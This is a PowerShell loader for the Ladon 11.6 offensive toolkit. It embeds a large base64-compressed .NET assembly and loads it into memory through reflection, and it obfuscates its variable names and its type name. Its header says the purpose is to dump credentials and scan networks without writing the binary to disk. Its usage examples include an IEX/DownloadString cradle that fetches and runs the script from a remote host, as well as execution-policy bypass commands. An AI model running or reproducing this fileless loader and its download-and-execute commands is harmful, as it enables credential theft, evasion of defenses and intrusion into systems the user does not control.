function Ladon
{
<#
.SYNOPSIS

This script leverages Ladon 11.6 and Reflection.Assembly to reflectively load Ladon completely in memory. This allows you to do things such as
dump credentials without ever writing the Ladon binary to disk. 

Required Dependencies: Ladon (included)
Optional Dependencies: None
Ladon version: 11.6 (20230911)

.DESCRIPTION

Reflectively loads Ladon 11.6 in memory using PowerShell. Can be used to scan network without writing anything to disk. Can be used for any 
functionality provided with Ladon.

.TestON

Win7 x86  (Microsoft Windows [6.1.7601])
Win8 x64  (Microsoft Windows [6.2.9200])
Win10 x64 (Microsoft Windows [10.0.14393])
Win11 x64 (Microsoft Windows [10.0.22000.856]

.EXAMPLE

Execute Ladon on the local computer to scan network OnlinePC.
Ladon OnlinePC
Ladon 192.168.1.8/24 OnlinePC

0x001 Cmd
powershell 
Import-Module .\Ladon.ps1
Ladon OnlinePC

0x002 Local
powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass Import-Module .\Ladon.ps1;Ladon whoami

0x003 Remote
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"

0x004 Bypass
powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC

0x005 Diy PortScan
powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan '22,80,135,445'


#>
Param      
(       
[parameter(
#Mandatory = $true,
Position = 0
)]
$Q7MGIzea = "",
[parameter(
Position = 1
)]
$z9cZmQB = "",
[parameter(
Position = 2
)]
$z8kaB = "",
[parameter(
Position = 3
)]
$Kjeb3g = "",
[parameter(
Position = 4
)]
$z8vie = "",
[parameter(
Position = 5
)]
$rdX9D = "",
[parameter(
Position = 6
)]
$Df9Dd = "",
[parameter(
Position = 7
)]
$vbtpb = "",
[parameter(
Position = 8
)]
$bH8T3b
)

$SkBSS =@'
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
'@
$hk3kd = New-object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($SkBSS),[IO.Compression.CompressionMode]::Decompress)
$AzdsZ = New-object Byte[](2941288)
$hk3kd.Read($AzdsZ, 0, 2941288) | Out-Null
$b8ujk = "Q29uc2"+"9sZUFwc"+"DEuUHJv"+"Z3JhbQ=="
$d3gsd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b8ujk))
$Kb82F = [Reflection.Assembly]::Load($AzdsZ).GetType($d3gsd)
If([String]::IsNullOrEmpty($bH8T3b)){ If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" -and $vbtpb -ne ""  ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd,$vbtpb))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D))} else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" ){$Kb82F::Main(@($Q7MGIzea,$z9cZmQB))}else {If($Q7MGIzea -ne "" ){$Kb82F::Main(@($Q7MGIzea))}}}}}}}}}
}
